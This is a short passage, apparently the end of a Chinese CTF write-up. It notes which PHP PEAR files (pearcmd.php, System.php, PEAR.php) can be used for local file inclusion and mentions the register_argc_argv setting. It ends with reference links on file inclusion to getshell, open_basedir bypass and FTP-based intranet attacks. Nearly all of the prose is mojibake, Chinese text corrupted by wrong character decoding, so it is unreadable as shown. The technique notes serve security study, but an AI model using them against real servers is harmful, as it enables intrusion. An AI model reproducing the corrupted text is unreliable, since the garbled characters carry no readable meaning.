å°è¯•ä½¿ç”¨è¿™äº›æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œå‘ç°`**cmd.php`æ–‡ä»¶ä¸èƒ½ç›´æ¥ç”¨æ¥åŒ…å«ï¼Œéœ€è¦æ›´æ”¹é…ç½®æ–‡ä»¶ï¼Œ`System.php`ã€`PEAR.php`å¯ä»¥

![16](/medias/show800/16.png)

![17](/medias/show800/17.png)

å¯¹äº`**cmd.php`æ–‡ä»¶ï¼Œéœ€è¦æ›´æ”¹é…ç½®é¡¹`register_argc_argv=On`ï¼Œåº”è¯¥ä¹Ÿæ˜¯å¯ä»¥åœ¨fastcgiæŠ¥æ–‡é‡Œå®ç°çš„å§ï¼Ÿ(x)

å¯ä»¥åœ¨è¿™é‡Œå–ç»

- [Docker PHPè£¸æ–‡ä»¶æœ¬åœ°åŒ…å«ç»¼è¿°](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp)

å‚è€ƒã€è‡´è°¢ï¼š

- [open_basedirç»•è¿‡](https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/)
- [fushulingã®blog](https://fushuling.com/index.php/2023/08/20/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/)
- [CTFSHOW å¸¸ç”¨å§¿åŠ¿ç¯‡ï¼ˆ801-810](https://blog.csdn.net/miuzzx/article/details/124008779)
- [å¦‚ä½•ç”¨ FTP è¢«åŠ¨æ¨¡å¼æ‰“ç©¿å†…ç½‘](https://www.anquanke.com/post/id/254387#h3-4)
- [CTFSHOW å¸¸ç”¨å§¿åŠ¿ç¯‡ï¼ˆ811-820ï¼‰](https://blog.csdn.net/miuzzx/article/details/124038567)